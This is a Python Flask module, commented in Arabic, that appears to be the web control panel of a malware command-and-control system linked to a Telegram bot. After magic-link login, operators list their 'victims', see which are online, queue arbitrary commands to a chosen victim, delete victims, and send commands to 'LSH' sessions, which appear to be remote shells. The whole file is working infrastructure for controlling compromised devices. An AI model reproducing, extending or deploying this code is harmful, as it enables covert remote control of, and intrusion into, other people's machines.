# web_dashboard.py
# ============================================================
# لوحة تحكم ويب — كل مستخدم له Dashboard خاص
# ============================================================

import os
import time
import uuid
import json
import html as html_module
from datetime import datetime, timedelta
from functools import wraps

from flask import (
    Blueprint, render_template, request, jsonify,
    redirect, make_response, session, abort
)

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("web_dashboard")


# ============================================================
# الإعدادات
# ============================================================
dashboard_bp = Blueprint('dashboard', __name__, url_prefix='/dashboard')

MAGIC_LINK_TTL = 300        # 5 دقائق
SESSION_TTL = 86400 * 7     # أسبوع
DASHBOARD_BASE_URL = PUBLIC_URL.rstrip('/')


# ============================================================
# Helpers
# ============================================================
def h(text):
    """Escape HTML"""
    if text is None:
        return ""
    return html_module.escape(str(text))


def _session_key(token):
    return f"dash_session:{token}"


def _magic_key(token):
    return f"dash_magic:{token}"


def _get_current_user():
    """يرجع chat_id من الـ session الحالية أو None"""
    token = request.cookies.get('dash_session')
    if not token:
        return None
    try:
        raw = redis_client.get(_session_key(token))
        if raw:
            return int(raw)
    except Exception as e:
        logger.warning(f"session read error: {e}")
    return None


def login_required(f):
    """Decorator: لازم تسجيل دخول"""
    @wraps(f)
    def wrapper(*args, **kwargs):
        chat_id = _get_current_user()
        if not chat_id:
            return redirect('/dashboard/login')
        return f(chat_id, *args, **kwargs)
    return wrapper


# ============================================================
# توليد Magic Link
# ============================================================
def generate_magic_link(chat_id):
    """ينشئ رابط دخول صالح 5 دقائق"""
    if not redis_client:
        return None
    try:
        token = uuid.uuid4().hex
        redis_client.setex(
            _magic_key(token),
            MAGIC_LINK_TTL,
            str(chat_id)
        )
        logger.info(f"Magic link generated for {chat_id}")
        return f"{DASHBOARD_BASE_URL}/dashboard/auth?token={token}"
    except Exception as e:
        logger.exception(f"generate_magic_link error: {e}")
        return None


# ============================================================
# المصادقة
# ============================================================
@dashboard_bp.route('/login')
def login_page():
    """صفحة تسجيل الدخول"""
    if _get_current_user():
        return redirect('/dashboard/')
    
    error = request.args.get('error', '')
    return render_template('dashboard/login.html',
                            error=error,
                            bot_url="https://t.me/" + get_bot_username())


@dashboard_bp.route('/auth')
def auth_magic():
    """يتحقق من Magic Link ويسجل دخول"""
    token = request.args.get('token', '').strip()
    if not token:
        return redirect('/dashboard/login?error=invalid')
    
    try:
        chat_id = redis_client.get(_magic_key(token))
        if not chat_id:
            return redirect('/dashboard/login?error=expired')
        
        # امسح التوكن
        redis_client.delete(_magic_key(token))
        
        # أنشئ session
        session_token = uuid.uuid4().hex
        redis_client.setex(
            _session_key(session_token),
            SESSION_TTL,
            str(chat_id)
        )
        
        response = make_response(redirect('/dashboard/'))
        response.set_cookie(
            'dash_session',
            session_token,
            max_age=SESSION_TTL,
            httponly=True,
            samesite='Lax',
        )
        logger.info(f"User logged in: {chat_id}")
        metrics.inc_counter("dashboard_logins")
        return response
    except Exception as e:
        logger.exception(f"auth_magic error: {e}")
        return redirect('/dashboard/login?error=server')


@dashboard_bp.route('/logout')
def logout():
    """تسجيل خروج"""
    token = request.cookies.get('dash_session')
    if token:
        try:
            redis_client.delete(_session_key(token))
        except Exception:
            pass
    
    response = make_response(redirect('/dashboard/login'))
    response.delete_cookie('dash_session')
    return response


def get_bot_username():
    """يجيب username البوت"""
    try:
        return bot.get_me().username
    except Exception:
        return "YourBot"


# ============================================================
# الصفحة الرئيسية
# ============================================================
@dashboard_bp.route('/')
@login_required
def dashboard_home(chat_id):
    """الصفحة الرئيسية"""
    return render_template('dashboard/index.html', chat_id=chat_id)


# ============================================================
# صفحة تفاصيل ضحية
# ============================================================
@dashboard_bp.route('/victim/<victim_id>')
@login_required
def victim_detail(chat_id, victim_id):
    """صفحة تفاصيل ضحية"""
    victim = redis_client.hgetall(f"victim:{chat_id}:{victim_id}")
    if not victim:
        abort(404)
    
    return render_template(
        'dashboard/victim.html',
        chat_id=chat_id,
        victim_id=victim_id,
        victim=victim
    )


# ============================================================
# صفحة LSH session
# ============================================================
@dashboard_bp.route('/lsh/<session_id>')
@login_required
def lsh_detail(chat_id, session_id):
    """صفحة تفاصيل LSH session"""
    # تحقق من الملكية
    owner = redis_client.get(f"lsh_session:{session_id}")
    if not owner or int(owner) != chat_id:
        abort(404)
    
    return render_template(
        'dashboard/lsh.html',
        chat_id=chat_id,
        session_id=session_id
    )


# ============================================================
# APIs
# ============================================================
@dashboard_bp.route('/api/stats')
@login_required
def api_stats(chat_id):
    """إحصائيات عامة"""
    try:
        vids = list(redis_client.smembers(f"victims:{chat_id}") or [])
        total = len(vids)
        
        # كم متصل الآن (آخر 60 ثانية)
        online = 0
        for vid in vids:
            v = redis_client.hgetall(f"victim:{chat_id}:{vid}")
            if v.get('last_seen'):
                try:
                    if time.time() - float(v['last_seen']) < 60:
                        online += 1
                except (ValueError, TypeError):
                    pass
        
        # أوامر اليوم
        today_key = f"dash_stats:{chat_id}:{datetime.utcnow().strftime('%Y-%m-%d')}"
        commands_today = int(redis_client.get(today_key) or 0)
        
        # جلسات LSH
        lsh_count = 0
        try:
            for key in redis_client.scan_iter(match=f"lsh_session:*", count=100):
                owner = redis_client.get(key)
                if owner and str(owner) == str(chat_id):
                    lsh_count += 1
        except Exception:
            pass
        
        return jsonify({
            'total': total,
            'online': online,
            'commands_today': commands_today,
            'lsh_sessions': lsh_count
        })
    except Exception as e:
        logger.exception(f"api_stats error: {e}")
        return jsonify({'error': str(e)}), 500


@dashboard_bp.route('/api/victims')
@login_required
def api_victims(chat_id):
    """قائمة الضحايا"""
    try:
        vids = list(redis_client.smembers(f"victims:{chat_id}") or [])
        victims = []
        
        for vid in vids:
            v = redis_client.hgetall(f"victim:{chat_id}:{vid}")
            if v:
                victims.append(v)
        
        victims.sort(
            key=lambda x: float(x.get('last_seen') or x.get('created_at') or 0),
            reverse=True
        )
        
        return jsonify(victims)
    except Exception as e:
        logger.exception(f"api_victims error: {e}")
        return jsonify({'error': str(e)}), 500


@dashboard_bp.route('/api/victim/<victim_id>')
@login_required
def api_victim(chat_id, victim_id):
    """تفاصيل ضحية واحدة"""
    try:
        if not redis_client.exists(f"victim:{chat_id}:{victim_id}"):
            return jsonify({'error': 'unauthorized'}), 403
        
        v = redis_client.hgetall(f"victim:{chat_id}:{victim_id}")
        return jsonify(v)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@dashboard_bp.route('/api/victim/<victim_id>/command', methods=['POST'])
@login_required
def api_send_command(chat_id, victim_id):
    """إرسال أمر لضحية"""
    try:
        # تحقق من الملكية
        if not redis_client.exists(f"victim:{chat_id}:{victim_id}"):
            return jsonify({'error': 'unauthorized'}), 403
        
        data = request.get_json(silent=True) or {}
        action = data.get('action', '').strip()
        payload = data.get('payload', {})
        
        if not action:
            return jsonify({'error': 'missing_action'}), 400
        
        # استورد وظيفة queue_victim_command
        from imports_manager import queue_victim_command
        ok = queue_victim_command(victim_id, action, **payload)
        
        # زود العداد
        today_key = f"dash_stats:{chat_id}:{datetime.utcnow().strftime('%Y-%m-%d')}"
        try:
            redis_client.incr(today_key)
            redis_client.expire(today_key, 86400 * 7)
        except Exception:
            pass
        
        # سجل الحدث
        _log_event(chat_id, {
            'type': 'command',
            'victim_id': victim_id,
            'action': action,
            'status': 'queued' if ok else 'failed'
        })
        
        metrics.inc_counter("dashboard_commands")
        return jsonify({'ok': ok})
    except Exception as e:
        logger.exception(f"api_send_command error: {e}")
        return jsonify({'error': str(e)}), 500


@dashboard_bp.route('/api/victim/<victim_id>/delete', methods=['POST'])
@login_required
def api_delete_victim(chat_id, victim_id):
    """حذف ضحية"""
    try:
        if not redis_client.exists(f"victim:{chat_id}:{victim_id}"):
            return jsonify({'error': 'unauthorized'}), 403
        
        # امسح بيانات الضحية
        v = redis_client.hgetall(f"victim:{chat_id}:{victim_id}")
        
        pipe = redis_client.pipeline()
        if v.get('victim_token'):
            pipe.delete(f"victim_token:{v['victim_token']}")
        pipe.delete(f"victim:{chat_id}:{victim_id}")
        pipe.delete(f"victim_cmd:{victim_id}")
        pipe.srem(f"victims:{chat_id}", victim_id)
        pipe.execute()
        
        return jsonify({'ok': True})
    except Exception as e:
        logger.exception(f"api_delete_victim error: {e}")
        return jsonify({'error': str(e)}), 500


@dashboard_bp.route('/api/activity')
@login_required
def api_activity(chat_id):
    """آخر الأحداث"""
    try:
        # اقرأ من Redis List (ندخلها من _log_event)
        key = f"dash_activity:{chat_id}"
        items = redis_client.lrange(key, 0, 49) or []
        
        events = []
        for item in items:
            try:
                events.append(json.loads(item))
            except json.JSONDecodeError:
                continue
        
        return jsonify(events)
    except Exception as e:
        logger.exception(f"api_activity error: {e}")
        return jsonify([])


@dashboard_bp.route('/api/lsh_sessions')
@login_required
def api_lsh_sessions(chat_id):
    """قائمة جلسات LSH"""
    try:
        sessions_list = []
        for key in redis_client.scan_iter(match="lsh_session:*", count=100):
            sid = key.replace("lsh_session:", "")
            owner = redis_client.get(key)
            if owner and str(owner) == str(chat_id):
                # اجلب metadata
                meta_raw = redis_client.get(f"lsh_session_meta:{sid}")
                meta = {}
                if meta_raw:
                    try:
                        meta = json.loads(meta_raw)
                    except Exception:
                        pass
                
                # اجلب last_seen من active
                is_active = bool(redis_client.get(f"lsh_active:{sid}"))
                pending = redis_client.llen(f"lsh_cmd:{sid}") or 0
                
                sessions_list.append({
                    'session_id': sid,
                    'created_at': meta.get('created_at', 0),
                    'last_seen': meta.get('last_seen', 0),
                    'reconnect_count': meta.get('reconnect_count', 0),
                    'is_active': is_active,
                    'pending_commands': pending
                })
        
        sessions_list.sort(key=lambda x: x.get('created_at', 0), reverse=True)
        return jsonify(sessions_list)
    except Exception as e:
        logger.exception(f"api_lsh_sessions error: {e}")
        return jsonify([])


@dashboard_bp.route('/api/lsh/<session_id>/command', methods=['POST'])
@login_required
def api_lsh_command(chat_id, session_id):
    """إرسال أمر لجلسة LSH"""
    try:
        # تحقق من الملكية
        owner = redis_client.get(f"lsh_session:{session_id}")
        if not owner or str(owner) != str(chat_id):
            return jsonify({'error': 'unauthorized'}), 403
        
        data = request.get_json(silent=True) or {}
        action = data.get('action', '').strip()
        payload = data.get('payload', {})
        
        if not action:
            return jsonify({'error': 'missing_action'}), 400
        
        from imports_manager import lsh_push_command
        ok = lsh_push_command(session_id, {'action': action, 'payload': payload})
        
        return jsonify({'ok': ok})
    except Exception as e:
        logger.exception(f"api_lsh_command error: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================================
# Event Logging
# ============================================================
def _log_event(chat_id, event):
    """يسجل حدث في Redis List"""
    if not redis_client:
        return
    try:
        event['timestamp'] = time.time()
        event['time_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        key = f"dash_activity:{chat_id}"
        pipe = redis_client.pipeline()
        pipe.lpush(key, json.dumps(event, ensure_ascii=False))
        pipe.ltrim(key, 0, 199)  # احتفظ بـ 200 حدث
        pipe.expire(key, 86400 * 7)
        pipe.execute()
    except Exception as e:
        logger.debug(f"_log_event error: {e}")


# ============================================================
# تسجيل الحدث من أماكن أخرى
# ============================================================
def log_user_event(chat_id, event):
    """public — استخدمها من أي مكان لتسجيل حدث"""
    _log_event(chat_id, event)


# ============================================================
# Init
# ============================================================
def init_web_dashboard(app):
    """تسجيل الـ blueprint"""
    app.register_blueprint(dashboard_bp)
    logger.info("[+] Web Dashboard registered at /dashboard")
